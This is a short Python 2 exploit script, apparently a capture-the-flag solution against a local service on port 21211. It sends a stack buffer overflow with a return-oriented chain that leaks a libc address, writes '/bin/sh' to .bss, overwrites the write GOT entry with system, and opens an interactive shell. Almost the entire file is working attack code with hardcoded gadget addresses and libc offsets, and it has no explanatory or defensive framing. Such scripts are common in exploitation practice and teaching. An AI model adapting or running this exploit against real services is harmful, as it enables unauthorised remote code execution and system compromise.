import socket
import struct
import time
import telnetlib


HOST = "localhost"
PORT = 21211

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((HOST,PORT))

print "[*] Connected to %s:%d"%(HOST,PORT)

bss_addr      = 0x8049648
plt_read	  = 0x804832c
plt_write	  = 0x804830c
got_write     = 0x8049614
pop3ret_addr  = 0x80484b6

write_offset  = 0xdac50
system_offset = 0x40190

buf="A"*140
#write got_write
buf+=struct.pack("<I",plt_write)
buf+=struct.pack("<I",pop3ret_addr)
buf+=struct.pack("<I",1)
buf+=struct.pack("<I",got_write)
buf+=struct.pack("<I",4)
#read /bin/sh
buf+=struct.pack("<I",plt_read)
buf+=struct.pack("<I",pop3ret_addr)
buf+=struct.pack("<I",0) 
buf+=struct.pack("<I",bss_addr)
buf+=struct.pack("<I",8)
#read system_addr
buf+=struct.pack("<I",plt_read)
buf+=struct.pack("<I",pop3ret_addr)
buf+=struct.pack("<I",0)
buf+=struct.pack("<I",got_write)
buf+=struct.pack("<I",4)
#system(/bin/sh)
buf+=struct.pack("<I",plt_write)
buf+=struct.pack("<I",0x12345678)
buf+=struct.pack("<I",bss_addr)
buf+="\n"

sock.send(buf)

libc_write = struct.unpack("<I",sock.recv(4))[0]
libc_bace  = libc_write - write_offset

print "[+] Got a libc_bace:0x%x"%libc_bace

system_addr  = libc_bace + system_offset

sock.send("/bin/sh\n")
print "[+] Sending /bin/sh"
sock.send(struct.pack("<I",system_addr))
print "[+] Overwriting got_write"

print "[+] Shell started"

t=telnetlib.Telnet()
t.sock=sock
t.interact()
sock.close()